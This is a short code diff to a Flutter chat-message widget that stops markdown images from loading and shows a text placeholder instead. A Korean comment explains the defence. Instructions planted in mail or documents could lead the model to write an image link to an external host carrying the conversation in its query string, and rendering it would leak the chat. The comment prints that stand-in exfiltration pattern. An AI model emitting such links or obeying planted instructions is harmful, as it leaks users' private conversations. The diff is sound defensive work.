@@ -710,6 +710,8 @@ class _Bubble extends StatelessWidget {
           tableCellsPadding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
           a: base.copyWith(color: Brand.blue, decoration: TextDecoration.underline),
         ),
+        // 이미지는 불러오지 않는다 — 메일·문서에 심은 지시로 모델이 ![](https://외부?q=대화내용)을 쓰면 그리기만 해도 외부로 샌다
+        imageBuilder: (_, _, alt) => Text('[이미지${alt == null || alt.isEmpty ? '' : ': $alt'}]', style: base.copyWith(color: Brand.muted)),
         onTapLink: (_, href, _) {
           final u = href == null ? null : Uri.tryParse(href);
           if (u != null && (u.scheme == 'https' || u.scheme == 'http')) launchUrl(u, mode: LaunchMode.externalApplication);
